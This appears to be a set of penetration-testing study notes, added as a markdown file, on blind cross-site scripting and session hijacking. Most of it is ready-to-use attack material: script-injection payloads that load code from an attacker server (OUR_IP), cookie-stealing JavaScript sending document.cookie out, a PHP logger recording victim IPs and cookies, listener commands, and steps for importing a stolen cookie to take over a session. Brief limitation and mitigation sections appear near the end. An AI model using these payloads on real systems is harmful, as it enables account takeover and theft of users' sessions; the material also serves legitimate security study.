@@ -1,0 +1,433 @@
+# XSS – Session Hijacking
+
+## Overview
+
+Modern web applications use cookies to maintain authenticated sessions. If an attacker can steal a victim’s session cookie, they may be able to impersonate that user without knowing their password.
+
+With XSS, we can execute JavaScript in the victim’s browser and use that to send cookie data back to an attacker-controlled server. This is commonly called:
+
+- **Session Hijacking**
+- **Cookie Stealing**
+
+---
+
+# What Makes This Possible?
+
+When a user logs in, the application often sets a session cookie such as:
+
+```http
+Set-Cookie: PHPSESSID=abc123...
+```
+
+The browser automatically sends that cookie back to the application on future requests.
+
+If we steal that cookie and import it into our own browser, we may inherit the victim’s authenticated session.
+
+---
+
+# Blind XSS
+
+## What is Blind XSS?
+
+A **Blind XSS** vulnerability happens when our payload executes somewhere we cannot directly see.
+
+Common examples:
+
+- contact forms
+- support tickets
+- review forms
+- user registration fields
+- admin-only dashboards
+- log viewers
+- HTTP headers like `User-Agent`
+
+In these cases, we submit input, but the payload only executes later when an administrator or another privileged user views it.
+
+---
+
+# Problem with Blind XSS
+
+Unlike regular XSS testing, we cannot directly observe:
+
+- which field is vulnerable
+- how the payload is rendered
+- which payload format works
+
+So we need a callback to our own server to confirm execution.
+
+---
+
+# Blind XSS Detection Strategy
+
+## Load a Remote Script
+
+Instead of using `alert(1)`, use a payload that makes the victim’s browser request a script from your machine:
+
+```html
+<script src="http://OUR_IP/script.js"></script>
+```
+
+If the browser requests `script.js`, then the payload executed.
+
+---
+
+## Identify Which Field is Vulnerable
+
+To track the vulnerable field, use a unique path per field:
+
+```html
+<script src="http://OUR_IP/fullname"></script>
+<script src="http://OUR_IP/username"></script>
+<script src="http://OUR_IP/address"></script>
+```
+
+If your server receives a request to `/username`, then the `username` field is vulnerable.
+
+---
+
+# Example Blind XSS Payloads
+
+Useful payloads for remote script loading:
+
+```html
+<script src=http://OUR_IP></script>
+```
+
+```html
+'><script src=http://OUR_IP></script>
+```
+
+```html
+"><script src=http://OUR_IP></script>
+```
+
+```html
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+```
+
+```html
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+```
+
+```html
+<script>$.getScript("http://OUR_IP")</script>
+```
+
+---
+
+# Start a Listener
+
+Create a simple web server to detect callbacks.
+
+## PHP listener
+
+```bash
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+sudo php -S 0.0.0.0:80
+```
+
+If the payload executes, the victim’s browser will request your hosted resource.
+
+---
+
+# Testing Fields
+
+Inject a callback payload into each likely field.
+
+Examples:
+
+```html
+<script src=http://OUR_IP/fullname></script>
+```
+
+```html
+<script src=http://OUR_IP/username></script>
+```
+
+```html
+<script src=http://OUR_IP/address></script>
+```
+
+Skip fields that are unlikely to be useful or viable, such as:
+
+- password fields
+- strongly validated email fields
+
+Wait for the admin or privileged user to load the page, then check your listener output.
+
+---
+
+# Session Hijacking
+
+Once we identify:
+
+- a working payload
+- the vulnerable field
+
+we can move from detection to exploitation.
+
+The goal is to steal the victim’s cookies.
+
+---
+
+# Cookie Theft Payloads
+
+Common JavaScript payloads:
+
+```javascript
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+```javascript
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+The second option is usually cleaner because it silently loads an image instead of redirecting the page.
+
+---
+
+# Host the JavaScript Payload
+
+Save the cookie-stealing JavaScript into `script.js`:
+
+```javascript
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+Then use an XSS payload that loads it:
+
+```html
+<script src=http://OUR_IP/script.js></script>
+```
+
+When the victim loads the vulnerable page:
+
+1. browser requests `script.js`
+2. `script.js` executes
+3. browser sends the cookie to `index.php?c=...`
+
+---
+
+# PHP Cookie Logger
+
+To log cookies cleanly, create `index.php`:
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+This splits multiple cookies and logs them neatly.
+
+---
+
+# Start the PHP Server
+
+```bash
+cd /tmp/tmpserver
+sudo php -S 0.0.0.0:80
+```
+
+---
+
+# Example Callback Output
+
+Terminal output may show:
+
+```text
+10.10.10.10:52798 [200]: /script.js
+10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
+```
+
+Logged file:
+
+```bash
+cat cookies.txt
+```
+
+```text
+Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
+```
+
+---
+
+# Reusing the Stolen Cookie
+
+Once the cookie is stolen, import it into your browser for the target application.
+
+## Manual browser import workflow
+
+On Firefox:
+
+1. Browse to target page
+2. Open Developer Tools
+3. Open Storage tab
+4. Add a new cookie
+5. Set:
+   - **Name** = text before `=`
+   - **Value** = text after `=`
+
+Example stolen cookie:
+
+```text
+cookie=f904f93c949d19d870911bf8b05fe7b2
+```
+
+Then set:
+
+- Name: `cookie`
+- Value: `f904f93c949d19d870911bf8b05fe7b2`
+
+Refresh the page. If valid, you will inherit the victim session.
+
+---
+
+# Attack Flow Summary
+
+1. identify a blind XSS sink
+2. use remote callback payloads to detect execution
+3. determine which field is vulnerable
+4. host a malicious `script.js`
+5. steal `document.cookie`
+6. log cookie values to file
+7. import cookie into browser
+8. hijack victim session
+
+---
+
+# Why Blind XSS is Dangerous
+
+Blind XSS is especially powerful because:
+
+- it often triggers in privileged admin panels
+- payloads may execute in internal tools you cannot reach directly
+- successful execution may yield:
+  - admin cookies
+  - CSRF-capable sessions
+  - access to hidden dashboards
+  - internal application views
+
+---
+
+# Important Limitations
+
+Session hijacking via XSS may fail if cookies use:
+
+- `HttpOnly`
+- `Secure` with non-HTTPS transport
+- short session lifetime
+- IP/session binding
+- secondary re-authentication checks
+
+## HttpOnly
+
+If the session cookie is marked `HttpOnly`, JavaScript cannot access it via `document.cookie`.
+
+That means direct cookie theft will fail, though XSS may still be used for other actions like CSRF-style abuse in the victim’s session.
+
+---
+
+# Defensive Notes
+
+Mitigations include:
+
+- output encoding
+- input sanitization
+- Content Security Policy (CSP)
+- `HttpOnly` cookies
+- `Secure` cookies
+- `SameSite` cookies
+- strict admin panel hardening
+- reviewing all stored user-supplied content
+- sandboxing internal moderation/review interfaces
+
+---
+
+# Quick Commands
+
+## Start PHP listener
+
+```bash
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+sudo php -S 0.0.0.0:80
+```
+
+## Blind XSS test payload
+
+```html
+<script src=http://OUR_IP/username></script>
+```
+
+## Cookie theft script
+
+```javascript
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+## Load remote script through XSS
+
+```html
+<script src=http://OUR_IP/script.js></script>
+```
+
+---
+
+# Example Files
+
+## `script.js`
+
+```javascript
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+## `index.php`
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+---
+
+# Key Takeaways
+
+- XSS can be used to steal cookies and hijack sessions
+- Blind XSS requires out-of-band detection
+- remote script loading is an effective discovery method
+- `document.cookie` is often the main target
+- `HttpOnly` cookies significantly reduce this risk
+- admin-only views make blind XSS especially dangerous
+
+---
+
+# Tags
+
+#xss  
+#blind-xss  
+#session-hijacking  
+#cookie-stealing  
+#web-security  
+#javascript  
+#php  
+#owasp  
+#obsidian
